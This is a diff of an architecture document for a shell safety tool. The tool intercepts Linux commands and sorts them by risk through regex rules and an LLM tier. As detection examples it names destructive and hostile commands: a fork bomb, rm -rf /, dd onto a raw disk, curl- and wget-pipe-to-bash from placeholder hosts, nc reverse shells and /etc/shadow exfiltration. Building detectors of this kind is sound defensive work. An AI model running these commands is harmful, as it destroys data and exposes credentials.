@@ -1,533 +1,350 @@
-# System Architecture
-## AI-Based System Intent Engine for Safe Linux Command Execution
+# AI System Intent Engine — Architecture
+
+## System Overview
+
+The AI System Intent Engine is a transparent, user-controlled AI safety layer that intercepts Linux shell commands before execution. It uses a three-tier decision pipeline to classify command intent and risk level, then presents an interactive terminal UI to the user for high-risk commands.
 
 ---
 
-## 1. High-Level Overview
-
-The Intent Engine is a **transparent, always-on safety layer** between a user's keypress and shell execution. It intercepts commands, classifies their risk in milliseconds, and presents a human-readable verdict before anything runs.
+## High-Level Architecture
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│                    USER'S TERMINAL                       │
-│   $ rm -rf /var/log/*     ← user presses Enter          │
-└──────────────────────┬──────────────────────────────────┘
-                       │
-          zsh preexec / bash DEBUG trap
-                       │
-┌──────────────────────▼──────────────────────────────────┐
-│                  SHELL HOOK (thin client)                │
-│  - Builds JSON payload from command + context            │
-│  - Sends to daemon via Unix socket (< 5ms overhead)      │
-│  - On BLOCK response: shows UI, waits for user choice    │
-│  - On SAFE response:  does nothing, command runs         │
-└──────────────────────┬──────────────────────────────────┘
-                       │ Unix domain socket
-                       │ POST /analyze
-┌──────────────────────▼──────────────────────────────────┐
-│            INTENT ENGINE DAEMON (FastAPI)                │
-│                                                          │
-│  1. Parser  →  ParsedCommand                             │
-│  2. Router  →  picks Tier                               │
-│                                                          │
-│  ┌─────────────────┐        ┌──────────────────────┐    │
-│  │  TIER 0 / 1     │        │  TIER 2 (only if     │    │
-│  │  Rule Engine    │─AMBIG─►│  AMBIGUOUS)          │    │
-│  │  (Praveen)      │        │  LLM Reasoner        │    │
-│  │  < 50ms         │        │  (Vansh) < 3.5s      │    │
-│  └────────┬────────┘        └──────────┬───────────┘    │
-│           └──────────┬─────────────────┘                │
-│                      │ Verdict                           │
-│  3. Build AnalyzeResponse                               │
-│  4. Write audit log                                      │
-└──────────────────────┬──────────────────────────────────┘
-                       │ should_block: true/false
-┌──────────────────────▼──────────────────────────────────┐
-│              CONFIRMATION UI (if blocked)                │
-│                                                          │
-│  ⚠ HIGH: rm -rf /var/log/*                              │
-│  Impact: Permanently deletes all system logs.            │
-│  Safer:  sudo journalctl --vacuum-size=500M              │
-│                                                          │
-│  [y] Execute  [n] Abort  [e] Edit  [s] Use safer         │
-└──────────────────────┬──────────────────────────────────┘
-                       │ user choice
-                  Shell executes
-                  (or doesn't)
-```
-
----
-
-## 2. Component Architecture
-
-### 2.1 Shell Hook
-
-**Files:** `hooks/intent_hook.zsh`, `hooks/intent_hook.bash`
-**Owner:** Harshit
-
-The hook is intentionally **thin** — it contains zero business logic.
-
-```
-Shell fires event (preexec / DEBUG trap)
-    │
-    ├─ Is engine enabled?           → NO  → pass through
-    ├─ Is INTENT_ENGINE_SKIP set?   → YES → pass through (one command)
-    ├─ Is it an engine command?     → YES → pass through
-    │
-    ▼
-Build JSON:  {command, cwd, user, is_sudo, shell, session_id}
-    │
-    ▼
-POST /analyze via Unix socket (curl, max 4s timeout)
-    │
-    ├─ Daemon unreachable? → warn once, deactivate for session
-    │
-    ▼
-Read AnalyzeResponse
-    │
-    ├─ should_block = false → do nothing, command runs
-    │
-    └─ should_block = true  → pipe response to terminal_ui.py
-                                │
-                                ├─ EXECUTE     → let command run
-                                ├─ ABORT       → suppress command
-                                ├─ EDIT        → return to shell prompt
-                                └─ USE_SAFER   → eval safer alternative
-```
-
-**Integration methods:**
-
-| Shell | Mechanism | How block works |
-|---|---|---|
-| Zsh | `preexec()` function | `zle send-break` cancels the command |
-| Bash | `trap '...' DEBUG` + `shopt -s extdebug` | Return 1 from trap prevents execution |
-
----
-
-### 2.2 Daemon
-
-**Files:** `engine/daemon/server.py`, `engine/daemon/router.py`, `engine/daemon/session.py`
-**Owner:** Harshit
-
-The daemon is a **warm Python process** started at shell login. It stays resident so there is no interpreter startup cost per command (~100-300ms saved per invocation).
-
-```
-Startup sequence:
-  1. Bind Unix socket at /tmp/intent_engine.sock
-  2. Write PID to /tmp/intent_engine.pid
-  3. Load config from ~/.intent_engine/config/config.toml
-  4. Initialize IntentRouter
-     ├─ Load RuleEngineClassifier (Praveen) → compile regex patterns
-     └─ Initialize LLMReasoner (Vansh)      → warm up LLM client
-  5. Ready — serve requests
-
-Per-request sequence (router.py):
-  AnalyzeRequest
-      │
-      ▼
-  Parser.parse()  →  ParsedCommand
-      │
-      ├─ Check session allowlist (ALWAYS_ALLOW) → return SAFE instantly
-      ├─ Check ALWAYS_DENY list                 → return CRITICAL instantly
-      │
-      ▼
-  RuleEngineClassifier.classify(parsed, ctx)
-      │
-      ├─ SAFE / LOW / MEDIUM / HIGH / CRITICAL  → build AnalyzeResponse
-      │
-      └─ AMBIGUOUS  ─────────────────────────►  LLMReasoner.reason()
-                                                     │
-                                                     ├─ Returns Verdict
-                                                     └─ Timeout (3s) → fallback LOW
-
-  Build AnalyzeResponse:
-      verdict.risk_level >= block_threshold?
-          YES → should_block = true
-          NO  → should_block = false
-
-  Write AuditLogEntry to ~/.intent_engine/logs/YYYY-MM-DD.jsonl
-
-  Return AnalyzeResponse
-```
-
-**Daemon endpoints:**
-
-| Endpoint | Method | Purpose |
-|---|---|---|
-| `/analyze` | POST | Primary — analyze a command |
-| `/health` | GET | Liveness check (shell hook pings at startup) |
-| `/reload-rules` | POST | Hot-reload pattern library without restart |
-| `/stats` | GET | Session stats by risk level |
-
----
-
-### 2.3 Command Parser
-
-**Files:** `engine/parser/command_parser.py`
-**Owner:** Harshit
-
-Converts a raw shell string into a structured `ParsedCommand` that carries all structural information the rule engine and LLM need.
-
-```
-Input:  "sudo rm -rf /var/log/* | tee /tmp/deleted.txt"
-
-Pipeline:
-  1. _split_pipes()         → ["sudo rm -rf /var/log/*", "tee /tmp/deleted.txt"]
-  2. _parse_single() each segment:
-       tokens    = shlex.split(segment)
-       is_sudo   = tokens[0] in {sudo, su, doas}
-       base_cmd  = first non-sudo token
-       flags     = tokens starting with "-"
-       arguments = tokens not starting with "-"
-       has_redirect = bool(redirect_regex.search(raw))
-       has_subshell = bool(subshell_regex.search(raw))
-       is_glob      = any("*?[" in arg)
-  3. Attach pipe_segments to root ParsedCommand
-
-Output: ParsedCommand(
-    raw         = "sudo rm -rf /var/log/* | tee /tmp/deleted.txt",
-    base_command = "rm",
-    flags        = ["-r", "-f"],
-    arguments    = ["/var/log/*"],
-    is_sudo      = True,
-    has_pipe     = True,
-    is_glob      = True,
-    glob_patterns = ["/var/log/*"],
-    pipe_segments = [<rm segment>, <tee segment>]
-)
-```
-
-**Edge cases handled:**
-
-| Case | Handling |
-|---|---|
-| Unclosed quotes | `shlex` raises `ValueError` → fallback to whitespace split |
-| `\|\|` (logical OR) | Detected and NOT split as pipe |
-| `&&` chains | Split as separate segments, all analyzed |
-| `;` chains | Split as separate segments, all analyzed |
-| Fork bomb `:(){ :\|:&};:` | Survives tokenization without crash |
-| Nested subshells `$(...)` | `has_subshell=True`, content noted |
-
----
-
-### 2.4 Rule Engine (Tier 0/1)
-
-**Files:** `engine/rule_engine/classifier.py`, `engine/rule_engine/pattern_matcher.py`
-**Owner:** Praveen
-**Data:** `rules/dangerous_patterns.toml`
-
-Two-tier classification with deterministic, fast-path logic.
-
-```
-classify(ParsedCommand, CommandContext)
-    │
-    ▼
-check_tier0(parsed)   ← Instant, 100% confidence, always CRITICAL
-    │
-    Checks (structural, not regex):
-    ├─ Fork bomb syntax detected?          → CRITICAL (confidence 1.0)
-    ├─ rm targeting / or /*?               → CRITICAL (confidence 1.0)
-    ├─ dd writing to /dev/sd* /dev/nvme*?  → CRITICAL (confidence 1.0)
-    ├─ mkfs.* targeting /dev/*?            → CRITICAL (confidence 1.0)
-    └─ pipe_segments[-1] is sh/bash AND
-       pipe_segments[0] is curl/wget?     → CRITICAL (confidence 1.0)
-
-    None matched → proceed to Tier 1
-    │
-    ▼
-match(parsed, ctx)   ← Pattern library scan
-    │
-    For each compiled pattern in dangerous_patterns.toml:
-        regex matches raw command?
-              │
-              YES → compute confidence:
-                     base_score = 0.70
-                     + 0.15  if is_sudo
-                     + 0.10  if target_path is /etc /boot /bin /sbin /dev
-                     + 0.08  if is_glob
-                     - 0.15  if target is /tmp
-                     - 0.20  if --dry-run / -n flag present
-                     - 0.05  if user is root
-
-    Take highest-confidence match.
-    confidence >= 0.55 → return Verdict(risk_level, confidence, ...)
-    confidence <  0.55 → return Verdict(AMBIGUOUS)
-```
-
-**Pattern library structure (`dangerous_patterns.toml`):**
-
-```
-Tier 0 (instant CRITICAL):
-  fork_bomb, rm_rf_root, dd_raw_device, mkfs_device, curl_pipe_shell
-
-Tier 1 HIGH:
-  rm_rf_var_log, chmod_777_system, shred_device, truncate_log,
-  rm_boot, iptables_flush, ufw_disable, crontab_remove,
-  reverse_shell_nc, history_erasure
-
-Tier 1 MEDIUM:
-  cat_shadow, expose_ssh_key, find_exec_delete, chmod_sudoers,
-  passwd_file_edit, sysrq_trigger
+┌──────────────────────────────────────────────────────────────────────┐
+│                         User Shell Session                          │
+│                                                                      │
+│   $ sudo rm -rf /opt/database   ← user presses Enter               │
+│          │                                                           │
+│          ▼ (Zsh: accept-line ZLE hook, Bash: DEBUG trap)            │
+│   Shell hook sends command to daemon via Unix socket                 │
+└──────────────────────────┬───────────────────────────────────────────┘
+                           │  HTTP POST /analyze
+                           │  (Unix domain socket: /tmp/intent_engine.sock)
+                           ▼
+┌──────────────────────────────────────────────────────────────────────┐
+│                     Intent Engine Daemon                            │
+│              (FastAPI + Uvicorn, async, single-process)             │
+│                                                                      │
+│  ┌─────────────┐   ┌──────────────────┐   ┌──────────────────────┐ │
+│  │   Command   │   │   Rule Engine    │   │    LLM Reasoner      │ │
+│  │   Parser    │──▶│   Tier 0 + 1    │──▶│   Tier 2 (Gemini)    │ │
+│  │   (shlex)   │   │   (TOML+regex)  │   │   + LRU Cache (128)  │ │
+│  └─────────────┘   └──────────────────┘   └──────────────────────┘ │
+│         │                  │                         │              │
+│         │          SAFE/HIGH/CRITICAL         AMBIGUOUS only        │
+│         │          returned directly           escalated to LLM     │
+│         └──────────────────┴─────────────────────────┤             │
+│                                                       ▼             │
+│                                           ┌──────────────────────┐ │
+│                                           │   Verdict Router     │ │
+│                                           │   (risk threshold    │ │
+│                                           │    comparison)       │ │
+│                                           └──────────┬───────────┘ │
+└──────────────────────────────────────────────────────│──────────────┘
+                                                       │
+                   ┌───────────────────────────────────┤
+                   │                                   │
+                   ▼                                   ▼
+         risk >= block_threshold               risk < block_threshold
+                   │                                   │
+                   ▼                                   ▼
+        ┌──────────────────┐               ┌──────────────────────┐
+        │   Terminal UI    │               │  Command ALLOWED     │
+        │ (ANSI 256-color) │               │  Shell continues     │
+        │ Risk + Intent    │               └──────────────────────┘
+        │ Safer alt        │
+        │ [y/n/s] choice   │
+        └────────┬─────────┘
+                 │
+      ┌──────────┴──────────┐
+      │                     │
+      ▼                     ▼
+ User: [y/s]          User: [n]
+ Command executes      Command aborted
+      │                     │
+      └──────────┬──────────┘
+                 ▼
+      ┌──────────────────────┐
+      │   Audit Logger       │
+      │   ~/.intent_engine/  │
+      │   logs/audit.jsonl   │
+      └──────────────────────┘
 ```
 
 ---
 
-### 2.5 LLM Reasoner (Tier 2)
+## Three-Tier Decision Pipeline
 
-**Files:** `engine/llm/reasoner.py`, `engine/llm/providers/`
-**Owner:** Vansh
+### Tier 0 — Structural Safety Checks (< 1ms)
 
-Only invoked when the rule engine returns `AMBIGUOUS`. Hard 3-second timeout.
+Hardcoded regex patterns, zero TOML lookup, always runs first. If matched, the command is immediately returned as `CRITICAL` without invoking any further processing.
 
-```
-reason(ParsedCommand, CommandContext, rule_hint_Verdict)
-    │
-    ▼
-PromptBuilder.build_system_prompt()    ← strict JSON schema enforcement
-PromptBuilder.build_analysis_prompt()  ← command + parsed details + context
-    │
-    ▼
-asyncio.wait_for(
-    LLMClient.complete(prompt, system),
-    timeout = 3.0s
-)
-    │
-    ├─ TimeoutError → router catches → fallback LOW verdict
-    │
-    ▼
-ResponseParser.parse(raw_json)
-    ├─ Validates JSON schema
-    ├─ Validates risk_level in {SAFE,LOW,MEDIUM,HIGH,CRITICAL}
-    ├─ Clamps confidence to [0.0, 1.0]
-    └─ Raises ValueError on malformed → router catches → fallback
+**Covered patterns (hardcoded, not configurable):**
+| Pattern | Example |
+|---------|---------|
+| Fork bomb | `:(){ :|:& };:` |
+| rm targeting filesystem root | `rm -rf /`, `rm -rf /*` |
+| dd writing to raw block device | `dd if=/dev/zero of=/dev/sda` |
+| curl-pipe-bash (remote code execution) | `curl http://x.sh \| bash` |
+| wget-pipe-bash | `wget -qO- http://x.sh \| sh` |
 
-    │
-    ▼
-SaferAlternativeSuggester.suggest()
-    ├─ Phase 1: table lookup (instant)
-    └─ Phase 2: LLM-generated (if no table entry)
+### Tier 1 — TOML Pattern Library (< 50ms)
 
-    │
-    ▼
-Return Verdict (never AMBIGUOUS)
-```
+A curated library of **41 patterns** loaded from `rules/dangerous_patterns.toml`. Each pattern carries:
+- `name`: unique identifier
+- `tier`: 0 or 1
+- `risk_level`: CRITICAL / HIGH / MEDIUM / LOW
+- `category`: destruction / storage / privilege / network / exposure / tampering / execution
+- `regex`: tested against the full raw command
+- `flags_required`: all flags that must be present
+- `path_pattern`: optional path-level regex
+- `reasoning_template`: plain-language explanation
+- `impact_template`: one-sentence impact for user display
+- `safer_alternative`: suggested safer command
 
-**Provider chain:**
+**Confidence Scoring:**
+Each Tier 1 match generates a confidence score (0.0–1.0) based on:
+- Base pattern confidence
+- `is_sudo`: +0.15
+- Path targeting critical system prefix: +0.20
+- Flags present: +0.10 per relevant flag
+- CWD proximity to dangerous path: +0.05
 
-```
-Config: provider = "ollama"
+If confidence ≥ threshold → return verdict directly  
+If confidence < threshold → return `AMBIGUOUS` → escalate to Tier 2
 
-LLMClientFactory.create(config)
-    │
-    ├─ Create OllamaClient
-    ├─ health_check() → True?  → use it
-    └─ False → create fallback_provider (e.g. GeminiClient)
+**Pattern Categories (Tier 1):**
+| Category | Example Patterns |
+|----------|-----------------|
+| destruction | `rm -rf` on `/var`, `/etc`, `/home` |
+| storage | Shred, secure-delete, disk overwrite |
+| privilege | `chmod 777 /etc`, `visudo` modification |
+| network | `nc` with data piping, exfil via curl |
+| exposure | `cat /etc/shadow`, `/proc/kcore` access |
+| tampering | History wipe, `.bashrc` modification |
+| execution | Base64-encoded scripts, obfuscated eval |
 
-Providers:
-  OllamaClient  → POST http://localhost:11434/api/chat  (local, private)
-  GeminiClient  → google.generativeai SDK               (API, cloud)
-  OpenAIClient  → openai SDK                            (API, cloud)
-```
+### Tier 2 — LLM Semantic Reasoning (< 2s with Gemini)
 
-**LLM output schema (enforced in system prompt):**
+Only invoked when Tier 1 returns `AMBIGUOUS`. Sends a structured prompt to the configured LLM provider.
 
+**LRU Cache:** A session-scoped 128-entry LRU cache ensures repeated commands are answered in < 1ms without re-calling the API.
+
+**Response Schema (strict JSON):**
 ```json
 {
-  "risk_level": "SAFE|LOW|MEDIUM|HIGH|CRITICAL",
-  "confidence": 0.0-1.0,
-  "reasoning": "detailed technical explanation",
-  "impact_summary": "one sentence plain-English impact",
-  "safer_alternative": "safer command or null"
+  "risk_level": "HIGH",
+  "confidence": 0.91,
+  "intent": "Permanently deletes the /opt/custom_app_database directory",
+  "impact_summary": "All database files, configurations, and indexes will be unrecoverably destroyed.",
+  "reasoning": "sudo + rm -rf targeting /opt/ indicates an administrative destructive operation.",
+  "safer_alternative": "mv /opt/custom_app_database /opt/custom_app_database.bak",
+  "safer_alternative_explanation": "Moves the directory to a backup location instead of deleting it."
 }
 ```
 
 ---
 
-### 2.6 Confirmation UI
+## Component Architecture
 
-**File:** `engine/ui/terminal_ui.py`
-**Owner:** Harshit
+### Command Parser (`engine/parser/`)
 
-Called by the shell hook via `echo "$response" | python3 -m engine.ui.terminal_ui`. Returns the user's choice on stdout.
+Parses raw shell input into a structured `ParsedCommand` AST.
 
 ```
-╔══════════════════════════════════════════════════════════╗
-║  ⚠  INTENT ENGINE — HIGH                               ║
-╠══════════════════════════════════════════════════════════╣
-║  Risk    : ████████░░ HIGH                              ║
-║  Impact  : Permanently deletes all system logs.         ║
-║  Detail  : Active logs in use by syslog and journald.   ║
-╠══════════════════════════════════════════════════════════╣
-║  Safer   : sudo journalctl --vacuum-size=500M           ║
-╠══════════════════════════════════════════════════════════╣
-║  [y] Execute original  [n] Abort  [e] Edit  [s] Safer  ║
-╚══════════════════════════════════════════════════════════╝
-Your choice: _
+raw: "sudo rm -rf /opt/db && echo done"
+          │
+          ▼
+     ParsedCommand
+       .base_command = "rm"
+       .args = ["-rf", "/opt/db"]
+       .flags = {"-r": True, "-f": True}
+       .is_sudo = True
+       .chain_segments = [seg1("rm -rf /opt/db"), seg2("echo done")]
+       .target_paths = ["/opt/db"]
+       .redirects = []
+       .pipes = []
+```
 
-Outputs to stdout: EXECUTE | ABORT | EDIT | USE_SAFER
+**Handles:**
+- Pipelines (`cmd1 | cmd2`)
+- Chained commands (`&&`, `||`, `;`)
+- Subshell expansion (`$(...)`, `` `...` ``)
+- Redirections (`>`, `>>`, `2>&1`)
+- Alias resolution
+- Quote and escape handling
+
+### Rule Engine (`engine/rule_engine/`)
+
+```
+PatternLoader  →  loads and validates dangerous_patterns.toml on startup
+     │
+     ▼
+PatternMatcher →  runs Tier 0 structural checks first
+     │            then iterates Tier 1 TOML patterns
+     │            computes confidence-weighted verdict
+     ▼
+ObfuscationDetector → catches base64, hex, variable-expansion tricks
+     │
+     ▼
+VerdictBuilder →  constructs final Verdict object with impact/alternatives
+```
+
+### LLM Reasoner (`engine/llm/`)
+
+```
+LLMClientFactory  →  resolves provider from config ("gemini" | "ollama" | "openai")
+     │
+     ▼
+GeminiClient      →  google-genai SDK, async via executor
+     │
+     ▼
+PromptBuilder     →  constructs system + user prompts from ParsedCommand
+     │
+     ▼
+ResponseParser    →  validates JSON schema, handles partial responses
+     │
+     ▼
+SaferAlternativeSuggester → curated lookup table + LLM fallback (no 2nd API call)
+     │
+     ▼
+_LRUVerdictCache  →  128-entry session cache, MD5 key on raw command
+```
+
+### Terminal UI (`engine/ui/terminal_ui.py`)
+
+Reads the daemon JSON response from stdin, renders the ANSI 256-color confirmation prompt to stderr, reads user input from `/dev/tty` (bypasses stdin redirect), and prints the decision (`EXECUTE`, `ABORT`, `USE_SAFER`) to stdout for the shell hook to consume.
+
+### Audit Logger (`engine/audit/`)
+
+Appends a structured JSONL record for every flagged command to `~/.intent_engine/logs/audit.jsonl`. Records include timestamp, command, risk level, confidence, pattern, tier, user action, user, cwd, session ID, and latency.
+
+---
+
+## Shell Integration
+
+### Zsh Hook (`hooks/intent_hook.zsh`)
+
+```zsh
+# Overrides the ZLE accept-line widget
+# Fires synchronously before execution — cannot be bypassed by normal shell usage
+function _intent_accept_line() {
+    # 1. Send command to daemon via curl --unix-socket
+    # 2. If should_block = true → pipe response to terminal_ui.py
+    # 3. Read user decision
+    # 4. EXECUTE / ABORT / USE_SAFER based on decision
+}
+zle -N accept-line _intent_accept_line
+```
+
+**Zsh hook guarantees:**
+- Fires before any execution (synchronous ZLE override)
+- Works with pipelines, chained commands, and aliases
+- Can be bypassed per-command with `INTENT_ENGINE_ENABLED=0`
+
+### Bash Hook (`hooks/intent_hook.bash`)
+
+```bash
+# Uses DEBUG trap — fires before each command
+trap '_intent_check "$BASH_COMMAND"' DEBUG
+```
+
+**Known limitation:** Bash `DEBUG` trap is not truly synchronous for all command types. In complex scripts, some commands may execute before the trap fires.
+
+---
+
+## Data Flow Diagram
+
+```
+User Input
+    │
+    ▼
+[Shell Hook] ──────────────────────────► [Daemon: /analyze endpoint]
+                  HTTP POST                         │
+                  Unix Socket                       │
+                                          ┌─────────▼──────────┐
+                                          │  Command Parser    │
+                                          │  shlex + AST       │
+                                          └─────────┬──────────┘
+                                                    │
+                                          ┌─────────▼──────────┐
+                                          │  Pre-scan (Tier 0) │
+                                          │  Full raw command  │
+                                          └─────────┬──────────┘
+                                                    │
+                                          CRITICAL? YES ──► Return CRITICAL verdict
+                                                    │ NO
+                                                    │
+                                          ┌─────────▼──────────┐
+                                          │  Tier 1: Pattern   │
+                                          │  Library (TOML)    │
+                                          │  Per chain segment │
+                                          └─────────┬──────────┘
+                                                    │
+                                          AMBIGUOUS? NO ──► Return verdict
+                                                    │ YES
+                                                    │
+                                          ┌─────────▼──────────┐
+                                          │  Tier 2: Gemini    │
+                                          │  LRU cache check   │
+                                          │  LLM if cache miss │
+                                          └─────────┬──────────┘
+                                                    │
+                                          ┌─────────▼──────────┐
+                                          │  Verdict Router    │
+                                          │  Compare to        │
+                                          │  block_threshold   │
+                                          └─────────┬──────────┘
+                                                    │
+                                     ┌──────────────┴─────────────┐
+                                     │                            │
+                              should_block=true            should_block=false
+                                     │                            │
+                                     ▼                            ▼
+                             [Hook: run terminal_ui]      [Hook: allow execution]
+                                     │
+                             [User: y/n/s]
+                                     │
+                             [Audit Logger]
 ```
 
 ---
 
-## 3. Data Flow
+## Performance Characteristics
 
-### 3.1 SAFE Command (Fast Path)
-
-```
-User types: ls -la /home
-    │
-    Hook → POST /analyze (< 5ms socket overhead)
-    │
-    Daemon → Parser → ParsedCommand(base="ls", flags=["-la"])
-    │
-    Router → check session allowlist → not found
-    │
-    Rule Engine Tier 0 → no match
-    Rule Engine Tier 1 → no pattern matches → confidence 0.0 → AMBIGUOUS?
-           wait — "ls" is not in any command list → SAFE returned directly
-    │
-    AnalyzeResponse(should_block=False)
-    │
-    Hook → does nothing
-    │
-    Shell executes: ls -la /home        ← total overhead < 20ms
-```
-
-### 3.2 CRITICAL Command (Rule Engine Fast Path)
-
-```
-User types: rm -rf /
-    │
-    Hook → POST /analyze
-    │
-    Daemon → Parser → ParsedCommand(
-        base="rm", flags=["-r","-f"], arguments=["/"], is_sudo=False
-    )
-    │
-    Router → Rule Engine Tier 0 → check_tier0()
-        rm + recursive + force + target="/" → MATCH
-        Returns Verdict(CRITICAL, confidence=1.0, tier="rule_engine")
-    │
-    AnalyzeResponse(should_block=True)        ← total: < 30ms
-    │
-    Hook → pipes response to terminal_ui.py
-    │
-    User sees prompt, types "n"
-    │
-    Hook suppresses the command — nothing is deleted
-```
-
-### 3.3 AMBIGUOUS Command (LLM Path)
-
-```
-User types: find /home -name ".env" -exec cat {} \;
-    │
-    Hook → POST /analyze
-    │
-    Parser → ParsedCommand(base="find", has_subshell=False, ...)
-    │
-    Rule Engine → no Tier 0 match
-    Rule Engine Tier 1 → "find" patterns check:
-        find_exec_delete? No (-exec cat, not rm)
-        find_root_delete? No (/home not /)
-        confidence = 0.40 → below threshold → AMBIGUOUS
-    │
-    Router → escalate to LLM (Tier 2)
-    │
-    LLM Prompt includes:
-        command, flags, paths, is_sudo, cwd, user,
-        rule hint: "confidence 0.40, escalating"
-    │
-    LLM responds (< 2s local):
-        {"risk_level":"MEDIUM","confidence":0.82,
-         "reasoning":"Executes cat on every .env file found...",
-         "impact_summary":"Exposes all secret keys in .env files.",
-         "safer_alternative":"find /home -name '.env' -ls"}
-    │
-    ResponseParser validates → Verdict(MEDIUM, 0.82, tier="llm")
-    │
-    AnalyzeResponse(should_block=True)        ← total: < 2.5s
-    │
-    User sees MEDIUM warning, types "s" (use safer)
-    │
-    Hook runs: find /home -name '.env' -ls   ← lists without exposing content
-```
+| Scenario | Latency | Notes |
+|----------|---------|-------|
+| Tier 0 match (fork bomb, rm -rf /) | < 1ms | Pure regex, no I/O |
+| Tier 1 match (TOML pattern) | 5–50ms | Pattern scan + confidence scoring |
+| Tier 2 cache hit (LRU) | < 1ms | MD5 hash lookup |
+| Tier 2 cache miss (Gemini API) | 500ms–2s | Depends on network, Gemini load |
+| Tier 2 cache miss (Ollama, GPU) | 2–5s | Depends on model size + VRAM |
+| Tier 2 cache miss (Ollama, CPU) | 30–90s | Not recommended for production |
 
 ---
 
-## 4. Latency Budget
+## LLM Provider Details
 
-| Code Path | Target | How Achieved |
-|---|---|---|
-| SAFE — pass-through | **< 20ms** | Warm daemon + Unix socket + instant rule skip |
-| RISKY — Tier 0 | **< 30ms** | Pure in-memory structural check, no regex |
-| RISKY — Tier 1 | **< 50ms** | Pre-compiled regex, ~30 patterns, no I/O |
-| AMBIGUOUS → LLM | **< 3.5s** | 3s hard timeout, local 3B model |
-| LLM timeout fallback | **< 20ms** | In-memory fallback verdict |
+| Provider | Model | SDK | Latency | Setup |
+|----------|-------|-----|---------|-------|
+| **Gemini (default)** | gemini-3.6-flash | `google-genai` | ~800ms–2s | API key via `INTENT_GEMINI_API_KEY` |
+| Ollama (local) | any GGUF model | `httpx` (REST) | 2–90s | `ollama serve` + model pull |
+| OpenAI | gpt-4o-mini | `openai` SDK | ~1–3s | API key via `INTENT_OPENAI_API_KEY` |
 
-**Why Unix socket over TCP loopback:**
-- TCP loopback: ~0.1–0.5ms per round trip (connection overhead)
-- Unix socket: ~0.01–0.05ms per round trip
-- At 100 commands/minute, this saves ~50ms/min — imperceptible but clean
+**No fine-tuning is applied to any model.** All models are used with carefully engineered prompts via zero-shot prompting. The Gemini model is not customized — it is the standard `gemini-3.6-flash` endpoint provided by Google AI Studio.
 
 ---
 
-## 5. Security Properties
+## Security Model
 
-| Property | How It's Achieved |
-|---|---|
-| **Never auto-execute** | `should_block=true` only pauses. User must type `y` to proceed. |
-| **Never silent block** | Every interception shows a visible UI with reasoning. |
-| **Privacy-first** | Ollama is the default LLM — commands never leave the machine. |
-| **Fail-open** | If daemon crashes or times out, commands pass through with a one-time warning. The engine is a safety aid, not a gatekeeper. |
-| **No root required** | Engine runs as the current user. No SUID, no kernel modules. |
-| **Audit trail** | All flagged commands logged to `~/.intent_engine/logs/` in JSONL format. |
-| **No command storage** | Only flagged commands are logged. SAFE commands are never persisted. |
+**What the engine protects against:**
+- Accidental execution of catastrophically destructive commands
+- Common one-liner attacks (`curl | bash`, reverse shells via `nc`)
+- Credential exfiltration (`cat /etc/shadow | nc ...`)
+- History tampering (`history -c`)
+- Obfuscated commands (base64, hex encoding)
 
----
-
-## 6. File → Responsibility Map
-
-```
-engine/
-├── models.py                ← Shared contract. All teams import this.
-├── config.py                ← Config loader (TOML, user overrides)
-│
-├── daemon/
-│   ├── server.py            ← FastAPI app, Unix socket, /analyze endpoint
-│   ├── router.py            ← Tier orchestration, latency tracking
-│   └── session.py           ← Per-session allowlist, stats
-│
-├── parser/
-│   └── command_parser.py    ← shlex tokenizer, pipe splitter, structural detection
-│
-├── rule_engine/
-│   ├── classifier.py        ← Entry point: classify(ParsedCommand) → Verdict
-│   ├── pattern_matcher.py   ← check_tier0() + match() implementations
-│   ├── pattern_loader.py    ← Loads + validates dangerous_patterns.toml
-│   └── service.py           ← Standalone FastAPI for isolated testing
-│
-├── llm/
-│   ├── client.py            ← Abstract base + provider factory
-│   ├── providers/
-│   │   ├── ollama.py        ← Local Ollama HTTP client
-│   │   ├── gemini.py        ← Google Gemini API
-│   │   └── openai.py        ← OpenAI API
-│   ├── prompt_builder.py    ← System prompt + analysis prompt assembly
-│   ├── reasoner.py          ← Core pipeline: prompt → LLM → parse → Verdict
-│   ├── response_parser.py   ← JSON parse + schema validation
-│   └── suggester.py         ← Safer alternative (table + LLM)
-│
-└── ui/
-    └── terminal_ui.py       ← ANSI confirmation prompt, stdin/stdout interface
-
-hooks/
-├── intent_hook.zsh          ← Zsh preexec intercept
-└── intent_hook.bash         ← Bash DEBUG trap intercept
-
-rules/
-└── dangerous_patterns.toml  ← Pattern library (Tier 0 + Tier 1)
-
-config/
-└── default_config.toml      ← All tuneable parameters with defaults
-```
+**What the engine does NOT protect against:**
+- Kernel exploits or root-level privilege escalation
+- Commands executed outside the monitored shell (other terminals, cron jobs, scripts)
+- A determined attacker with shell access who can `unset` the hook
+- Compiled binaries or direct syscalls bypassing the shell entirely
